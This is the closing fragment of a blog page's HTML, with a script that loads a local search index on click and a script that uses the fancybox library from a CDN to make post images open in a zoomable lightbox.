  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
